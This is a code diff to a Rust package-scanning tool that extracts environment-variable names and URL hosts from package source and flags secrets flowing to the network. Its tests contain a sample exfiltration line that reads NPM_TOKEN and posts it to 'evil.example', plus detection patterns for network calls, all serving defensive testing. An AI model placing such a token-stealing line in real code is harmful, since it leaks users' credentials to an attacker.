@@ -9405,9 +9405,21 @@ impl SourceProfiler {
         self.files_scanned += 1;
         let lower = content.to_ascii_lowercase();
 
-        for pattern in ["process.env", "os.environ", "getenv("] {
-            if lower.contains(pattern) {
-                self.add(CapabilityKind::EnvRead, "*", path, pattern);
+        let env_targets = extract_env_read_targets(content);
+        if env_targets.is_empty() {
+            for pattern in ["process.env", "os.environ", "getenv("] {
+                if lower.contains(pattern) {
+                    self.add(CapabilityKind::EnvRead, "*", path, pattern);
+                }
+            }
+        } else {
+            for name in env_targets {
+                self.add(
+                    CapabilityKind::EnvRead,
+                    name.clone(),
+                    path,
+                    format!("static env read `{name}`"),
+                );
             }
         }
 
@@ -9435,20 +9447,32 @@ impl SourceProfiler {
             }
         }
 
-        for pattern in [
-            "fetch(",
-            "require(\"http\")",
-            "require('http')",
-            "require(\"https\")",
-            "require('https')",
-            "axios",
-            "requests.",
-            "urllib.request",
-            "httpx.",
-            "socket.",
-        ] {
-            if lower.contains(pattern) {
-                self.add(CapabilityKind::HttpRequest, "*", path, pattern);
+        let http_hosts = extract_http_hosts(content);
+        if http_hosts.is_empty() {
+            for pattern in [
+                "fetch(",
+                "require(\"http\")",
+                "require('http')",
+                "require(\"https\")",
+                "require('https')",
+                "axios",
+                "requests.",
+                "urllib.request",
+                "httpx.",
+                "socket.",
+            ] {
+                if lower.contains(pattern) {
+                    self.add(CapabilityKind::HttpRequest, "*", path, pattern);
+                }
+            }
+        } else {
+            for host in http_hosts {
+                self.add(
+                    CapabilityKind::HttpRequest,
+                    host.clone(),
+                    path,
+                    format!("static URL host `{host}`"),
+                );
             }
         }
 
@@ -9495,6 +9519,108 @@ impl SourceProfiler {
     }
 }
 
+fn extract_env_read_targets(content: &str) -> BTreeSet<String> {
+    let mut targets = BTreeSet::new();
+    collect_process_env_dot_targets(content, &mut targets);
+    for marker in ["process.env[", "os.environ[", "os.getenv(", "getenv("] {
+        collect_quoted_argument_targets(content, marker, &mut targets);
+    }
+    targets
+}
+
+fn collect_process_env_dot_targets(content: &str, targets: &mut BTreeSet<String>) {
+    let marker = "process.env.";
+    let mut offset = 0;
+    while let Some(index) = content[offset..].find(marker) {
+        let start = offset + index + marker.len();
+        let name = content[start..]
+            .chars()
+            .take_while(|ch| ch.is_ascii_alphanumeric() || *ch == '_')
+            .collect::<String>();
+        if !name.is_empty() {
+            targets.insert(name);
+        }
+        offset = start.saturating_add(1);
+    }
+}
+
+fn collect_quoted_argument_targets(content: &str, marker: &str, targets: &mut BTreeSet<String>) {
+    let mut offset = 0;
+    while let Some(index) = content[offset..].find(marker) {
+        let start = offset + index + marker.len();
+        if let Some((target, consumed)) = parse_quoted_literal(content[start..].trim_start()) {
+            if !target.is_empty()
+                && target
+                    .chars()
+                    .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
+            {
+                targets.insert(target);
+            }
+            offset = start + consumed;
+        } else {
+            offset = start.saturating_add(1);
+        }
+    }
+}
+
+fn extract_http_hosts(content: &str) -> BTreeSet<String> {
+    quoted_string_literals(content)
+        .into_iter()
+        .filter(|literal| literal.starts_with("http://") || literal.starts_with("https://"))
+        .filter_map(|literal| {
+            reqwest::Url::parse(&literal)
+                .ok()
+                .and_then(|url| url.host_str().map(str::to_owned))
+        })
+        .collect()
+}
+
+fn quoted_string_literals(content: &str) -> Vec<String> {
+    let mut literals = Vec::new();
+    let bytes = content.as_bytes();
+    let mut index = 0;
+    while index < bytes.len() {
+        if matches!(bytes[index], b'\'' | b'"' | b'`') {
+            if let Some((literal, consumed)) = parse_quoted_literal(&content[index..]) {
+                literals.push(literal);
+                index += consumed;
+                continue;
+            }
+        }
+        index += 1;
+    }
+    literals
+}
+
+fn parse_quoted_literal(content: &str) -> Option<(String, usize)> {
+    let bytes = content.as_bytes();
+    let quote = *bytes.first()?;
+    if !matches!(quote, b'\'' | b'"' | b'`') {
+        return None;
+    }
+
+    let mut literal = Vec::new();
+    let mut escaped = false;
+    for (index, byte) in bytes.iter().enumerate().skip(1) {
+        if escaped {
+            literal.push(*byte);
+            escaped = false;
+            continue;
+        }
+        if *byte == b'\\' {
+            escaped = true;
+            continue;
+        }
+        if *byte == quote {
+            return String::from_utf8(literal)
+                .ok()
+                .map(|literal| (literal, index + 1));
+        }
+        literal.push(*byte);
+    }
+    None
+}
+
 fn module_from_profile(package: &ResolvedPackage, capabilities: &[CapabilityFinding]) -> Module {
     let behavior = if capabilities.is_empty() {
         BehaviorType::Pure
@@ -9502,8 +9628,38 @@ fn module_from_profile(package: &ResolvedPackage, capabilities: &[CapabilityFind
         BehaviorType::HostCapability
     };
     let mut code = Vec::new();
-    for finding in capabilities {
-        code.push(Op::Cap(cap_op_from_finding(finding)));
+    let env_findings = capabilities
+        .iter()
+        .filter(|finding| finding.kind == CapabilityKind::EnvRead)
+        .collect::<Vec<_>>();
+    let http_findings = capabilities
+        .iter()
+        .filter(|finding| finding.kind == CapabilityKind::HttpRequest)
+        .collect::<Vec<_>>();
+
+    if env_findings.is_empty() || http_findings.is_empty() {
+        for finding in capabilities {
+            code.push(Op::Cap(cap_op_from_finding(finding)));
+        }
+    } else {
+        for env in &env_findings {
+            for http in &http_findings {
+                code.push(Op::Cap(cap_op_from_finding(env)));
+                let mut cap = cap_op_from_finding(http);
+                if let CapOp::HttpRequest { request } = &mut cap {
+                    request.body_from_stack = true;
+                }
+                code.push(Op::Cap(cap));
+            }
+        }
+        for finding in capabilities.iter().filter(|finding| {
+            !matches!(
+                finding.kind,
+                CapabilityKind::EnvRead | CapabilityKind::HttpRequest
+            )
+        }) {
+            code.push(Op::Cap(cap_op_from_finding(finding)));
+        }
     }
     code.push(Op::Const(Value::Unit));
     code.push(Op::Return);
@@ -14431,14 +14587,67 @@ wheels = [
             "const token = process.env.NPM_TOKEN; fetch('https://evil.example', { body: token });",
         );
         let profile = profiler.finish();
+        assert!(profile.capabilities.iter().any(
+            |finding| finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"
+        ));
         assert!(profile
             .capabilities
             .iter()
-            .any(|finding| finding.kind == CapabilityKind::EnvRead));
-        assert!(profile
-            .capabilities
+            .any(|finding| finding.kind == CapabilityKind::HttpRequest
+                && finding.target == "evil.example"));
+    }
+
+    #[test]
+    fn generated_profile_module_models_static_env_to_network_flow() {
+        let package = ResolvedPackage {
+            ecosystem: Ecosystem::Npm,
+            name: "date-helper".to_owned(),
+            version: "1.2.4".to_owned(),
+            source_url: "https://example.invalid/date-helper.tgz".to_owned(),
+            download_url: None,
+            local_path: None,
+            filename: "date-helper.tgz".to_owned(),
+            expected_sha256: None,
+            expected_sha1: None,
+            expected_integrity: None,
+            npm_direct_tarball: false,
+            pypi_direct_wheel: false,
+            npm_scripts: BTreeMap::new(),
+            platform_compatible: true,
+            dependencies: Vec::new(),
+        };
+        let findings = vec![
+            CapabilityFinding {
+                kind: CapabilityKind::EnvRead,
+                target: "NPM_TOKEN".to_owned(),
+                source: "index.js".to_owned(),
+                evidence: "static env read `NPM_TOKEN`".to_owned(),
+            },
+            CapabilityFinding {
+                kind: CapabilityKind::HttpRequest,
+                target: "evil.example".to_owned(),
+                source: "index.js".to_owned(),
+                evidence: "static URL host `evil.example`".to_owned(),
+            },
+        ];
+        let module = module_from_profile(&package, &findings);
+        let http = module.functions[0]
+            .code
             .iter()
-            .any(|finding| finding.kind == CapabilityKind::HttpRequest));
+            .find_map(|op| match op {
+                Op::Cap(CapOp::HttpRequest { request }) => Some(request),
+                _ => None,
+            })
+            .unwrap();
+        assert!(http.body_from_stack);
+
+        let policy = Policy::pure()
+            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
+            .allow_capability(Capability::HttpHost("evil.example".to_owned()));
+        let error = verify_module(&module, &policy).unwrap_err();
+        assert!(error.findings.iter().any(|finding| finding
+            .message
+            .contains("env:NPM_TOKEN may not flow to network:evil.example")));
     }
 
     #[test]
